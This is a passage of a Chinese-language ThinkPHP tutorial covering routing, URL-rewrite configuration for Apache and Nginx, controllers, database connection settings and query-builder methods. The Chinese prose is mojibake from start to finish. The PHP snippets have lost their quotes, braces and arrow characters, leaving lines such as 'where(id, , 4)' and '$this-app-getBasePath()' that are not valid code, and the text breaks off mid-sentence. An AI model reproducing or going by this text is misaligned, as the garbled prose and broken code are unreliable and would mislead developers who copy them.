æ³¨æ„ï¼šè¿™é‡ŒæœåŠ¡å™¨å¯åŠ¨æ˜¯ php think run çš„å†…ç½®æœåŠ¡å™¨ï¼Œä¸‹èŠ‚è¯¾ä¼šæ¢è®¨å¤–ç½®æœåŠ¡å™¨ï¼› ç»“æ„åˆ†æï¼š serverNameå°±æ˜¯æˆ‘ä»¬çš„ï¼š127.0.0.1:8000ï¼› index.php æ˜¯å…¥å£æ–‡ä»¶ï¼Œå¸¦ä¸Š / ï¼› æ§åˆ¶å™¨æ˜¯app\\controller\\Index.phpä¸­çš„ Index è¿™ä¸ªåç§°ï¼Œä¹Ÿå°±æ˜¯ç±»åï¼› æ“ä½œæ˜¯ç±»é‡Œé¢çš„æ–¹æ³•åï¼Œæ¯”å¦‚ï¼šindexï¼ˆé»˜è®¤æ–¹æ³•ï¼‰ï¼Œhelloï¼ˆæ™®é€šæ–¹æ³•ï¼‰ï¼› é»˜è®¤æ–¹æ³•å¯ä»¥çœç•¥ï¼Œä¼šç›´æ¥æ–¹æ³•ï¼Œå…¶ä»–æ™®é€šæ–¹æ³•éœ€è¦é”®å…¥æ–¹æ³•åï¼š http://127.0.0.1:8000/index.php/Index (é»˜è®¤æ‰§è¡Œindexæ“ä½œ) http://127.0.0.1:8000/index.php/Index/index (å®Œæ•´è·¯å¾„) http://127.0.0.1:8000/index.php/Index/test (æ™®é€šæ–¹æ³•ï¼Œå¿…é¡»å®Œæ•´è·¯å¾„) ç³»ç»Ÿé»˜è®¤è‡ªå¸¦çš„helloæ–¹æ³•ï¼Œæ˜¯é’ˆå¯¹åç»­è·¯ç”±çš„ï¼Œåœ¨è·¯ç”±æ–‡ä»¶è®¾ç½®è¿‡å¯¼è‡´æ— æ•ˆï¼› æˆ‘ä»¬åœ¨configapp.phpä¸­å°†è·¯ç”±å…³é—­ï¼šwith_route = false, http://127.0.0.1:8000/index.php/Index/hello ï¼ˆæ‰§è¡Œé»˜è®¤å‚æ•°å€¼ï¼‰ http://127.0.0.1:8000/index.php/Index/hello/name/Worldï¼ˆä¿®æ”¹å‚æ•°å€¼ï¼‰ å‚æ•°ä¸å¤Ÿç›´è§‚ï¼Œå°¤å…¶å¤šå‚æ•°çš„æ—¶å€™ï¼Œä¹Ÿæ˜¯æ”¯æŒä¼ ç»Ÿæ–¹æ¡ˆçš„ï¼š http://127.0.0.1:8000/index.php/Index/hello?name=World ï¼ˆé—®å·é”®å€¼å¯¹ï¼‰ URLé‡å†™å¯ä»¥é€šè¿‡URLé‡å†™éšè—åº”ç”¨çš„å…¥å£æ–‡ä»¶index.phpï¼ˆä¹Ÿå¯ä»¥æ˜¯å…¶å®ƒçš„å…¥å£æ–‡ä»¶ï¼Œä½†URLé‡å†™é€šå¸¸åªèƒ½è®¾ç½®ä¸€ä¸ªå…¥å£æ–‡ä»¶ï¼‰,ä¸‹é¢æ˜¯ç›¸å…³æœåŠ¡å™¨çš„é…ç½®å‚è€ƒï¼š [ Apache ] httpd.confé…ç½®æ–‡ä»¶ä¸­åŠ è½½äº†mod_rewrite.soæ¨¡å— AllowOverride None å°†Noneæ”¹ä¸º All æŠŠä¸‹é¢çš„å†…å®¹ä¿å­˜ä¸º.htaccessæ–‡ä»¶æ”¾åˆ°åº”ç”¨å…¥å£æ–‡ä»¶çš„åŒçº§ç›®å½•ä¸‹ IfModule mod_rewrite.c Options +FollowSymlinks -Multiviews RewriteEngine On RewriteCond %REQUEST_FILENAME !-d RewriteCond %REQUEST_FILENAME !-f RewriteRule ^(.*)$ index.php/$1 [QSA,PT,L]/IfModule [ Nginx ]åœ¨Nginxä½ç‰ˆæœ¬ä¸­ï¼Œæ˜¯ä¸æ”¯æŒPATHINFOçš„ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡åœ¨Nginx.confä¸­é…ç½®è½¬å‘è§„åˆ™å®ç°ï¼š location / // â€¦..çœç•¥éƒ¨åˆ†ä»£ç  if (!-f $request_filename) rewrite ^(.*)$ /index.php?s=/$1 last; å…¶å®å†…éƒ¨æ˜¯è½¬å‘åˆ°äº†ThinkPHPæä¾›çš„å…¼å®¹URLï¼Œåˆ©ç”¨è¿™ç§æ–¹å¼ï¼Œå¯ä»¥è§£å†³å…¶ä»–ä¸æ”¯æŒPATHINFOçš„WEBæœåŠ¡å™¨ç¯å¢ƒã€‚ å¤–ç½®æœåŠ¡å™¨ï¼Œæ¯”å¦‚phpEnvï¼Œçœç•¥äº†å…¥å£æ–‡ä»¶ï¼Œåˆ™å‡ºç°å¦‚ä¸‹é—®é¢˜ï¼š æŸ¥çœ‹æ‰‹å†Œï¼Œæ ¹æ®å®ƒURLé‡å†™çš„ä¿®æ”¹æ–¹æ¡ˆï¼ˆApacheï¼‰ï¼Œéœ€è¦ä¿®æ”¹.htaccessæœ€åä¸€è¡Œï¼š #RewriteRule ^(.*)$ index.php/$1 [QSA,PT,L] Apacheæ›¿æ¢æˆä¸‹é¢ä¸€è¡ŒRewriteRule ^(.*)$ index.php [L,E=PATH_INFO:$1] æ§åˆ¶å™¨å®šä¹‰ æ§åˆ¶å™¨ï¼šé¡¾åæ€ä¹‰MVCä¸­çš„Cï¼Œå³é€»è¾‘æ§åˆ¶å®šä¹‰ï¼› é»˜è®¤åœ¨app\\controllerä¸‹ç¼–å†™å¯¹åº”çš„æ§åˆ¶å™¨ç±»æ–‡ä»¶ï¼Œå¦‚æœæƒ³æ”¹é»˜è®¤ç›®å½•ï¼Œåœ¨configroute.phpä¸­è¿›è¡Œä¿®æ”¹ï¼š // è®¿é—®æ§åˆ¶å™¨å±‚åç§°controller_layer = controller, ç±»åå’Œæ–‡ä»¶åå¤§å°å†™ä¿æŒä¸€è‡´ï¼Œå¹¶é‡‡ç”¨é©¼å³°å¼ï¼ˆé¦–å­—æ¯å¤§å†™ï¼‰ï¼› ?phpnamespace app\\controller;class User public function index() return ç”¨æˆ·ï¼; public function login($name = city) return ç™»é™†æˆåŠŸï¼.$name; Userç±»åˆ›å»ºä¸¤ä¸ªæ–¹æ³• index(é»˜è®¤)å’Œ loginï¼Œè®¿é—® URL å¦‚ä¸‹ï¼š http://127.0.0.1:8000/index.php/user/ http://127.0.0.1:8000/index.php/user/login http://127.0.0.1:8000/index.php/User/login?name = Mancity é‚£ä¹ˆå¦‚æœåˆ›å»ºçš„æ˜¯åŒå­—æ¯ç»„åˆï¼Œæ¯”å¦‚ class HelloWorldï¼Œè®¿é—® URL å¦‚ä¸‹ï¼š http://127.0.0.1:8000/Index.php/helloworld http://127.0.0.1:8000/Index.php/Hello_World ?phpnamespace app\\controller;class HelloWorld public function index() return Hello world!; åŸºç¡€å’Œç©ºæ§åˆ¶å™¨åŸºç¡€æ§åˆ¶å™¨ ä¸€èˆ¬æ¥è¯´ï¼Œåˆ›å»ºæ§åˆ¶å™¨åï¼Œæ¨èç»§æ‰¿åŸºç¡€æ§åˆ¶å™¨æ¥è·å¾—æ›´å¤šçš„åŠŸèƒ½æ–¹æ³•ï¼› åŸºç¡€æ§åˆ¶å™¨ä»…ä»…æä¾›äº†æ§åˆ¶å™¨éªŒè¯åŠŸèƒ½ï¼Œå¹¶æ³¨å…¥äº†think\\Appå’Œthink\\Requestï¼› namespace app\\controller;use app\\BaseController;class User extends BaseController public function index() // è¿”å›å®é™…è·¯å¾„ return $this-app-getBasePath(); // è¿”å›å½“å‰æ–¹æ³•å return $this-request-action(); ç©ºæ§åˆ¶å™¨ ç©ºæ§åˆ¶å™¨ä¸€èˆ¬ç”¨äºè½½å…¥ä¸å­˜åœ¨çš„æ§åˆ¶å™¨æ—¶ï¼Œè¿›è¡Œé”™è¯¯æç¤ºï¼› class Error public function __call(string $name, array $arguments) return å½“å‰æ§åˆ¶å™¨ä¸å­˜åœ¨ï¼; æ•°æ®åº“åˆ›å»ºæ•°æ®åº“åŠè¡¨æˆ‘è¿™è¾¹ä½¿ç”¨navicatè½¯ä»¶é…åˆphpstudyè¿›è¡Œåˆ›å»ºçš„ï¼Œè¿™è¾¹æˆ‘å°±ä¸è¯¦ç»†è¯´æ˜äº† è¿æ¥æ•°æ®åº“å’ŒæŸ¥è¯¢è¿æ¥æ•°æ®åº“ æˆ‘ä»¬å¯ä»¥åœ¨ config\\database.php é…ç½®æ–‡ä»¶ä¸­è®¾ç½®ä¸æ•°æ®åº“çš„è¿æ¥ä¿¡æ¯ï¼š å¦‚æœæ˜¯ä¸€èˆ¬æ€§æ•°æ®åº“è¿æ¥ï¼Œåœ¨ â€˜â€™connectionsâ€˜â€™ é…ç½®åŒºè®¾ç½®å³å¯ï¼› å¦‚æœæ˜¯æœ¬åœ°æµ‹è¯•ï¼Œå®ƒä¼šä¼˜å…ˆè¯»å– .env é…ç½®ï¼Œç„¶åå†è¯»å– database.php çš„é…ç½®ï¼› # .envæ–‡ä»¶ï¼Œéƒ¨ç½²æœåŠ¡å™¨ï¼Œè¯·ç¦ç”¨æˆ‘APP_DEBUG = trueDB_TYPE = mysqlDB_HOST = 127.0.0.1DB_NAME = demoDB_USER = rootDB_PASS = 123456DB_PORT = 3306DB_CHARSET = utf8DEFAULT_LANG = zh-cn å¦‚æœç¦ç”¨äº† .env é…ç½®ï¼Œåˆ™ä¼šè¯»å–æ•°æ®åº“è¿æ¥çš„é»˜è®¤é…ç½®ï¼š // æ•°æ®åº“è¿æ¥é…ç½®ä¿¡æ¯connections = [ mysql = [ // æ•°æ®åº“ç±»å‹ type = env(DB_TYPE, mysql), // æœåŠ¡å™¨åœ°å€ hostname = env(DB_HOST, 127.0.0.1), // æ•°æ®åº“å database = env(DB_NAME, demo), // ç”¨æˆ·å username = env(DB_USER, root), // å¯†ç  password = env(DB_PASS, 123456), // ç«¯å£ hostport = env(DB_PORT, 3306), PHPè·å–æ•°æ® æˆ‘ä»¬æš‚æ—¶æ²¡æœ‰è¯¦ç»†å­¦ä¹ æ­¤ç±»è¯­æ³•ï¼Œå¯ä»¥ç®€å•ç”¨ä¸€äº›äº†è§£ä¸€ä¸‹å³å¯ï¼š // å¼•å…¥Dbæ•°æ®åº“ç±»use think\\facade\\Db;class User extends BaseController public function get() // è¿æ¥userè¡¨ï¼ŒæŸ¥è¯¢ $user = Db::table(users)-select(); // è¾“å‡ºæ•°æ® return json($user); æ•°æ®æŸ¥è¯¢tableæ–¹æ³• Dbç±»æ——ä¸‹æœ‰ä¸€ä¸ª table é™æ€è°ƒç”¨çš„æ–¹æ³•ï¼Œå‚æ•°ä¸ºå®Œæ•´çš„è¡¨åï¼ˆå‰ç¼€éƒ½ä¸èƒ½çœç•¥ï¼‰ï¼› å¦‚æœå¸Œæœ›åªæŸ¥è¯¢ä¸€æ¡æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨ find() æ–¹æ³•ï¼Œéœ€æŒ‡å®š where æ¡ä»¶ï¼š // é€šè¿‡IDæŸ¥è¯¢æŒ‡å®šçš„æ•°æ®// find æ–¹æ³•æŸ¥è¯¢ç»“æœä¸å­˜åœ¨ï¼Œè¿”å› nullï¼Œå¦åˆ™è¿”å›ç»“æœæ•°ç»„$user = Db::table(user)-where(id, 1)-find(); æƒ³è¦äº†è§£æ‰§è¡Œçš„åŸç”ŸSQLæ˜¯ä»€ä¹ˆï¼Œå¯ä»¥æ³¨é‡Šæ‰ return ç›´æ¥é€šè¿‡ trace æŸ¥çœ‹ï¼› ä½¿ç”¨ findOrEmpty() æ–¹æ³•ä¹Ÿå¯ä»¥æŸ¥è¯¢ä¸€æ¡æ•°æ®ï¼Œä½†åœ¨æ²¡æœ‰æ•°æ®æ—¶è¿”å›ä¸€ä¸ªç©ºæ•°ç»„ï¼š // æ²¡æœ‰æ•°æ®è¿”å›ç©ºæ•°ç»„$user = Db::table(user)-where(id, 11)-findOrEmpty(); ä½¿ç”¨ findOrFail() æ–¹æ³•åŒæ ·å¯ä»¥æŸ¥è¯¢ä¸€æ¡æ•°æ®ï¼Œåœ¨æ²¡æœ‰æ•°æ®æ—¶æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼š // æ²¡æœ‰æ•°æ®æŠ›å‡ºå¼‚å¸¸$user = Db::table(user)-where(id, 11)-findOrFail(); æƒ³è¦è·å–å¤šåˆ—æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨ select() æ–¹æ³•ï¼š // æŸ¥è¯¢æ‰€æœ‰æ•°æ®$user = Db::table(user)-select(); select() æ–¹æ³•é»˜è®¤è¿”å› Collection å¯¹è±¡çš„æ•°æ®é›†ï¼Œå¯ä»¥é€šè¿‡ toArray() æ–¹æ³•è½¬æ¢æˆæ•°ç»„ï¼š // ç”¨ä¸­æ–­å‡½æ•°ï¼Œæ¥æ£€æµ‹è¿”å›å€¼$user = Db::table(user)-select();halt($user);// è½¬æ¢æˆæ•°ç»„$user = Db::table(user)-select()-toArray();halt($user); å¤šåˆ—æ•°æ®ä¹Ÿå¯ä»¥å‚ä¸ where() æ–¹æ³•çš„ç­›é€‰ï¼š // å¤šåˆ—ç­›é€‰$user = Db::table(user)-where(age, 14)-select(); é“¾å¼æŸ¥è¯¢ æˆ‘ä»¬å‘ç°é€šè¿‡æŒ‡å‘ç¬¦å· â€œ-â€ å¤šæ¬¡è¿ç»­è°ƒç”¨æ–¹æ³•ç§°ä¸ºï¼šé“¾å¼æŸ¥è¯¢ï¼› å½“ Db::table(â€œuserâ€) æ—¶ï¼Œè¿”å›æŸ¥è¯¢å¯¹è±¡ï¼ˆQueryï¼‰ï¼Œå³å¯è¿ç¼€æ•°æ®åº“å¯¹åº”çš„æ–¹æ³•ï¼› å½“è¿”å›æŸ¥è¯¢å¯¹è±¡ï¼ˆQueryï¼‰æ—¶ï¼Œå°±å¯ä»¥ç»§ç»­è°ƒç”¨é“¾å¼æ–¹æ³•ï¼Œwhere() ä¹Ÿæ˜¯é“¾å¼æ–¹æ³•ï¼› è€Œ where() è¢«è°ƒç”¨åï¼Œä¾æ—§è¿”å›ï¼ˆQueryï¼‰ï¼Œå¯ä»¥å†æ¬¡é“¾å¼è°ƒç”¨ï¼› åœ¨æ‰‹å†Œ æ•°æ®åº“ - æŸ¥è¯¢æ„é€ å™¨ - é“¾å¼æ“ä½œ å¯ä»¥äº†è§£æ‰€æœ‰å¯é“¾å¼çš„æ–¹æ³•ï¼štableã€whereç­‰ï¼› ç›´åˆ°é‡åˆ° find() æˆ– select() è¿”å›æ•°ç»„æˆ–æ•°æ®é›†æ—¶ï¼Œç»“æŸæŸ¥è¯¢ï¼› è¡¨è¾¾å¼æŸ¥è¯¢ æŸ¥è¯¢è¡¨è¾¾å¼æ”¯æŒå¤§éƒ¨åˆ†å¸¸ç”¨çš„ SQL è¯­å¥ï¼Œè¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š where(å­—æ®µå,æŸ¥è¯¢è¡¨è¾¾å¼,æŸ¥è¯¢æ¡ä»¶); æ‰€æœ‰çš„è¡¨è¾¾å¼ï¼ŒæŸ¥é˜…æ‰‹å†Œ - æŸ¥è¯¢è¡¨è¾¾å¼ ä¸­çš„è¡¨æ ¼å³å¯ï¼›è¿™é‡Œåˆ—å‡ºå‡ ä¸ªæ„æ€ä¸€ä¸‹ï¼š è¡¨è¾¾å¼ å«ä¹‰ å¿«æ·æ–¹å¼ ç­‰äº time å°äºç­‰äºæŸä¸ªæ—¶é—´ whereTime EXP SQLè¡¨è¾¾å¼æŸ¥è¯¢ whereExp [NOT] LIKE æ¨¡ç³ŠæŸ¥è¯¢ whereLike [NOT] IN [é] IN æŸ¥è¯¢ whereIN æŸ¥è¯¢ç¤ºä¾‹ æ¡ä»¶åˆ¤æ–­ç±»çš„ï¼Œidå¤§äº4çš„ï¼› // æŸ¥è¯¢idå¤§äº4çš„æ•°æ®$user = Db::name(user)-where(id, , 4)-select();return json($user); Likeæ¨¡ç³ŠæŸ¥è¯¢ï¼Œå§“ç‹çš„ï¼› // æŸ¥è¯¢å§“ç‹çš„ç”¨æˆ·$user = Db::name(user)-where(name, like, ç‹%)-select();// likeå¿«æ·æ–¹å¼$user = Db::name(user)-whereLike(name, ç‹%)-select(); INåŒºé—´æŸ¥è¯¢ï¼Œæ ¹æ®idï¼› // åŒºé—´æŸ¥è¯¢ï¼Œæ”¯æŒnot in$user = Db::name(user)-where(id, in, 1, 3, 5)-select();// è¯­ä¹‰æ›´å¥½ä¸€ç‚¹$user = Db::name(user)-where(id, in, [1,3,5])-select();// INå¿«æ·æŸ¥è¯¢ï¼Œä¸¤ç§å‡å¯ï¼Œæ”¯æŒwhereNotIn$user = Db::name(user)-whereIn(id, [1, 2, 3])-select();// Betweenï¼Œå’ŒINä¸€æ · æ”¯æŒ not between$user = Db::name(user)-where(id, between, [2,5])-select();// å¿«æ·æ–¹å¼å’ŒINä¸€æ ·ï¼šwhereBetweenå’ŒwhereNotBetween NULLæŸ¥è¯¢ï¼› // NULL, null æˆ– not nullï¼š$user = Db::name(user)-where(details, not null)-select();// å¿«æ·æ–¹å¼ï¼šwhereNullå’ŒwhereNotNull EXPæŸ¥è¯¢ï¼Œè‡ªå®šä¹‰SQLç‰‡æ®µï¼› // EXPæŸ¥è¯¢ï¼Œè‡ªå®šä¹‰SQL$user = Db::name(user)-where(id, EXP, 8 and id 5)-select();// å¿«æ·æŸ¥è¯¢$user = Db::name(user)-whereExp(id, 8 and id 5)-select(); è¡¨å‰ç¼€ä¹‹æ‰©å±•æŸ¥è¯¢è¡¨å‰ç¼€ ä¸€èˆ¬æ¥è¯´ï¼Œä¸ºäº†ä¿æŒè¡¨åç»Ÿä¸€æ€§å’Œé˜²æ­¢å†²çªï¼Œéƒ½ä¼šç»™è¡¨åŠ ä¸Šä¸€ä¸ªå‰ç¼€ï¼Œä»¥ä¸‹åˆ’çº¿ç»“æŸï¼› æ¯”å¦‚ï¼štp_userï¼Œè¿™é‡Œçš„ tp_ å°±æ˜¯è¡¨å‰ç¼€ï¼Œæ‰€æœ‰ï¼› æˆ‘ä»¬ä¿®æ”¹MySQLä¸­è¡¨åï¼Œç„¶ååˆ·æ–°ç¨‹åºï¼ŒæŠ¥é”™ï¼› å½“ç„¶ï¼Œä½ å¯ä»¥ä¼ é€’ **Db::table(â€œtp_userâ€)**ï¼Œä½†æ²¡å¿…è¦ï¼› é¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥æ¥é…ç½®ç»Ÿä¸€å‰ç¼€ï¼š åœ¨ .env æ–‡ä»¶ä¸­ æ·»åŠ ï¼šDB_PREFIX = tp_ å¦‚æœéƒ¨ç½²ç¯å¢ƒ database.php ä¸­ è®¾ç½® prefix = env(DB_PREFIX, tp_), ç„¶åï¼Œä½¿ç”¨ Db::name(â€œuserâ€) æ–¹æ³•å³å¯ï¼š // æ­¤æ—¶ï¼Œtp_ è¡¨åçš„å‰ç¼€å¯ä»¥çœç•¥$user = Db::name(user)-select(); æ‰©å±•æŸ¥è¯¢ é€šè¿‡ value() æ–¹æ³•ï¼Œå¯ä»¥æŸ¥è¯¢æŒ‡å®šå­—æ®µçš„å€¼ï¼ˆå•ä¸ªï¼‰ï¼Œæ²¡æœ‰æ•°æ®è¿”å› null ï¼› // value() æ–¹æ³•æŸ¥è¯¢å•ä¸ªåˆ—å€¼$user = Db::name(user)-where(id, 3)-value(name); é€šè¿‡ colunm() æ–¹æ³•ï¼Œå¯ä»¥æŸ¥è¯¢æŒ‡å®šåˆ—çš„å€¼ï¼ˆå¤šä¸ªï¼‰ï¼Œæ²¡æœ‰æ•°æ®è¿”å›ç©ºæ•°ç»„ï¼› // colunm() æ–¹æ³•æŸ¥è¯¢å¤šä¸ªåˆ—å€¼$user = Db::name(user)-column(name);// é€šè¿‡id ä½œä¸ºç´¢å¼•$user = Db::name(user)-column(name,age, id); å½“å¤§é‡æ•°æ®éœ€è¦ æ‰¹å¤„ç† æ—¶ï¼Œæ¯”å¦‚ç»™æ‰€æœ‰ç”¨æˆ·æ›´æ–°æ•°æ®ï¼Œå°±ä¸èƒ½ä¸€æ¬¡æ€§å…¨å–å‡ºæ¥ï¼Œä¸€æ‰¹ä¸€æ‰¹çš„æ¥ï¼› // æ‰¹é‡å¤„ç†Db::name(user)-chunk(2, function ($users) foreach ($users as $user) dump($user); echo 1;);// é€šè¿‡è·å–æœ€åçš„SQLè¯­å¥ï¼Œå‘ç°ç”¨çš„æ˜¯LIMIT 2return Db::getLastSql(); å¦ä¸€ç§å¤„ç†å¤§é‡æ•°æ®ï¼šæ¸¸æ ‡æŸ¥è¯¢ï¼Œä¸ºäº†è§£å†³å†…å­˜å¼€é”€ï¼Œæ¯æ¬¡è¯»å–ä¸€è¡Œï¼Œå¹¶è¿”å›åˆ°ä¸‹ä¸€è¡Œå†è¯»å–ï¼› // æ‰¹é‡å¤„ç†2$users = Db::name(user)-cursor();// PHPç”Ÿæˆå™¨// halt($user);foreach ($users as $user) dump($user); æ·»åŠ æ•°æ®å•æ¡æ–°å¢ ä½¿ç”¨ insert() æ–¹æ³•å¯ä»¥å‘æ•°æ®è¡¨æ·»åŠ ä¸€æ¡æ•°æ®ï¼Œæ›´å¤šçš„å­—æ®µé‡‡ç”¨é»˜è®¤ï¼› public function add() // æ•°æ®$data = [ name = å¼ éº»å­, age = 28, gender = ç”·];// å•æ¡æ–°å¢ï¼ŒæˆåŠŸè¿”å›1return Db::name(user)-insert($data); å¦‚æœæƒ³å¼ºè¡Œæ–°å¢æŠ›å¼ƒä¸å­˜åœ¨çš„å­—æ®µæ•°æ®ï¼Œåˆ™ä½¿ç”¨ strick(false) æ–¹æ³•ï¼Œå¿½ç•¥å¼‚å¸¸ï¼› // æ•°æ®$data = [ name = é©¬é‚¦å¾·, age = 30, gender = ç”·, deta = æˆ‘è„¸ä¸Šæ²¡æœ‰éº»å­ï¼];// å•æ¡æ–°å¢ï¼ŒæˆåŠŸè¿”å›1return Db::name(user)-strict(false)-insert($data); å¦‚æœæˆ‘ä»¬é‡‡ç”¨çš„æ•°æ®åº“æ˜¯ mysqlï¼Œå¯ä»¥æ”¯æŒ replace å†™å…¥ï¼› insert å’Œ replace insert å†™å…¥çš„åŒºåˆ«ï¼Œå‰è€…è¡¨ç¤ºè¡¨ä¸­å­˜åœ¨ä¸»é”®ç›¸åŒåˆ™æŠ¥é”™ï¼Œåè€…åˆ™ä¿®æ”¹ï¼› // æ–°å¢æ•°æ®æ—¶ï¼Œä¸»é”®å†²çªæ—¶ï¼Œç›´æ¥ä¿®æ”¹è¿™æ¡è®°å½•Db::name(user)-replace()-insert($data); ä½¿ç”¨ insertGetId() æ–¹æ³•ï¼Œå¯ä»¥åœ¨æ–°å¢æˆåŠŸåè¿”å›å½“å‰æ•°æ® IDï¼› // è¿”å›è‡ªå¢IDreturn Db::name(user)-replace()-insertGetId($data); å¤šæ¡æ–°å¢ ä½¿ç”¨ insertAll() æ–¹æ³•ï¼Œå¯ä»¥æ‰¹é‡æ–°å¢æ•°æ®ï¼Œä½†è¦ä¿æŒæ•°ç»„ç»“æ„ä¸€è‡´ï¼› // æ•°æ®$data = [[ name = æ—å…‹, age = 19, gender = ç”·, details = å…ˆæ”¶é›†999ä¸ªå‘€å“ˆå“ˆï¼],[ name = æ™®å°”äºš, age = 100, gender = å¥³, details = æˆ‘å…ˆæ¥ä¸ªè¿”è€è¿˜ç«¥ï¼Œå†å¿«é€Ÿé•¿å¤§ï¼]];return Db::name(user)-insertAll($data); insertAll() æ–¹æ³• ä¹Ÿæ”¯æŒ replace å†™å…¥ï¼Œå¦‚æœæ·»åŠ æ•°æ®é‡å¤§ï¼Œå¯ä»¥é€šè¿‡ - limit() æ–¹æ³•é™åˆ¶æ·»åŠ æ•°é‡ï¼› Db::name(user)-replace()-limit(100)-insertAll($data); æ›´æ–°ï¼Œåˆ é™¤ä»¥åŠsaveæ–¹æ³•æ•°æ®ä¿®æ”¹ ä½¿ç”¨ update() æ–¹æ³•æ¥ä¿®æ”¹æ•°æ®ï¼Œä¿®æ”¹æˆåŠŸè¿”å›å½±å“è¡Œæ•°ï¼Œæ²¡æœ‰ä¿®æ”¹è¿”å› 0ï¼› // ä¿®æ”¹çš„æ•°æ®$data = [ name = ç‹ä¸‰ç‹—, age = 13,];// æ‰§è¡Œä¿®æ”¹å¹¶è¿”å›return Db::name(user)-where(id, 4)-update($data); å¦‚æœä¿®æ”¹æ•°æ®åŒ…å«äº†ä¸»é”®ä¿¡æ¯ï¼Œæ¯”å¦‚ idï¼Œé‚£ä¹ˆå¯ä»¥çœç•¥æ‰ where æ¡ä»¶ï¼› // ä¿®æ”¹çš„æ•°æ®$data = [ id = 4, name = ç‹ä¸‰ç‹—, age = 13,];// æ‰§è¡Œä¿®æ”¹å¹¶è¿”å›return Db::name(user)-update($data); å¦‚æœæƒ³è®©ä¸€äº›å­—æ®µä¿®æ”¹æ—¶æ‰§è¡Œ SQL å‡½æ•°æ“ä½œï¼Œå¯ä»¥ä½¿ç”¨ exp() æ–¹æ³•å®ç°ï¼› // è®©detailså­—æ®µå†…çš„è‹±æ–‡å¤§å†™return Db::name(user)-exp(details, UPPER(details))-update($data); å¦‚æœè¦è‡ªå¢è‡ªå‡æŸä¸ªå­—æ®µï¼Œå¯ä»¥ä½¿ç”¨ incdec æ–¹æ³•ï¼Œå¹¶æ”¯æŒè‡ªå®šä¹‰æ­¥é•¿ï¼› // ä¿®æ”¹æ—¶ï¼Œè®©ageè‡ªå¢å’Œè‡ªå‡ï¼Œé»˜è®¤1ï¼Œè¦å»æ‰$dataé‡Œé¢ageå­—æ®µçš„ä¿®æ”¹ï¼Œä¸ç„¶å†²çªreturn Db::name(user)-inc(age)-dec(age, 2)-update($data);// æ´¾ç”Ÿè‡ªå­—æ®µï¼Œå»¶è¿Ÿæ‰§è¡Œï¼Œæ¯«ç§’setInc(age, 1, 600)setDec(age, 2, 600) ä½¿ç”¨ Db::raw() æ¥è®¾ç½®æ¯ä¸ªå­—æ®µçš„ç‰¹æ®Šéœ€æ±‚ï¼Œçµæ´»ä¸”æ¸…æ™°ï¼š // ä½¿ç”¨Db::raw æ›´åŠ æ¸…æ™°çµæ´»Db::name(user)-where(id, 4)-update([ details = Db::raw(UPPER(details)), age = Db::raw(age-2)]);return Db::getLastSql(); save() æ–¹æ³•æ˜¯ä¸€ä¸ªé€šç”¨æ–¹æ³•ï¼Œå¯ä»¥è‡ªè¡Œåˆ¤æ–­æ˜¯æ–°å¢è¿˜æ˜¯ä¿®æ”¹(æ›´æ–°)æ•°æ®ï¼› // åŒ…å«ä¸»é”®ï¼Œå³ä¿®æ”¹ï¼›å¦åˆ™ï¼Œæ–°å¢return Db::name(user)-save($data); æ•°æ®åˆ é™¤ æç®€åˆ é™¤å¯ä»¥æ ¹æ®ä¸»é”®ç›´æ¥åˆ é™¤ï¼Œåˆ é™¤æˆåŠŸè¿”å›å½±å“è¡Œæ•°ï¼Œå¦åˆ™ 0ï¼› // æ ¹æ®ä¸»é”®åˆ é™¤Db::name(user)-delete(8); æ ¹æ®ä¸»é”®ï¼Œè¿˜å¯ä»¥åˆ é™¤å¤šæ¡è®°å½•ï¼› // æ ¹æ®ä¸»é”®åˆ é™¤å¤šæ¡Db::name(user)-delete([48,49,50]); æ­£å¸¸æƒ…å†µä¸‹ï¼Œé€šè¿‡ where()æ–¹æ³•æ¥åˆ é™¤ï¼› // æ¡ä»¶åˆ é™¤Db::name(user)-where(id, 47)-delete(); å…¶ä»–å„ç§æŸ¥è¯¢æ–¹å¼å­—ç¬¦ä¸²æ¡ä»¶ whereRaw å¯ä»¥ç›´æ¥å†™å…¥å¤šæ¡ä»¶ï¼š // å¤šæ¡ä»¶å­—ç¬¦ä¸²$user = Db::name(user)-whereRaw(age 15 AND gender=å¥³)-select(); åŒ…å«å˜é‡çš„å¤šæ¡ä»¶æŸ¥è¯¢ï¼š // å˜é‡$age = 15;$gender = å¥³;// é¢„å¤„ç†æœºåˆ¶$user = Db::name(user)-whereRaw(age:age AND gender=:gender, [ age = $age, gender = $gender])-select(); field()å­—æ®µç­›é€‰ ä½¿ç”¨ field() æ–¹æ³•ï¼Œå¯ä»¥æŒ‡å®šè¦æŸ¥è¯¢çš„å­—æ®µï¼› // å­—æ®µç­›é€‰$user = Db::name(user)-field(id, age, gender)-select();$user = Db::name(user)-field([id, age, gender])-select(); ä½¿ç”¨ field() æ–¹æ³•ï¼Œç»™æŒ‡å®šçš„å­—æ®µè®¾ç½®åˆ«åï¼› // å­—æ®µåˆ«å$user = Db::name(user)-field(id, gender as sex)-select();$user = Db::name(user)-field([id, gender=sex])-select(); åœ¨ fieldRaw() æ–¹æ³•é‡Œï¼Œå¯ä»¥ç›´æ¥ç»™å­—æ®µè®¾ç½® MySQL å‡½æ•°ï¼› // ç›´æ¥SQLå‡½æ•°$user = Db::name(user)-fieldRaw(id, UPPER(details))-select();$user = Db::name(user)-field(true)-select(); // æ¨èreturn Db::getLastSql(); ä½¿ç”¨ withoutField() æ–¹æ³•ä¸­å­—æ®µæ’é™¤ï¼Œå¯ä»¥å±è”½æ‰æƒ³è¦ä¸æ˜¾ç¤ºçš„å­—æ®µï¼› // æ’é™¤å­—æ®µ$user = Db::name(user)-withoutField(details)-select(); ä½¿ç”¨ field() æ–¹æ³•åœ¨æ–°å¢æ—¶ï¼ŒéªŒè¯å­—æ®µçš„åˆæ³•æ€§ï¼› // æ’é™¤æ–°å¢å­—æ®µDb::name(user)-field(name,age,gender)-insert($data); å¸¸ç”¨é“¾å¼æ–¹æ³• ä½¿ç”¨ alias() æ–¹æ³•ï¼Œç»™æ•°æ®åº“èµ·ä¸€ä¸ªåˆ«åï¼› // ç»™æ•°æ®åº“èµ·ä¸ªåˆ«åDb::name(user)-alias(a)-select();return Db::getLastSql();// èµ·åˆ«åæœ€ä¸»è¦æ˜¯å’Œå¦ä¸€å¼ 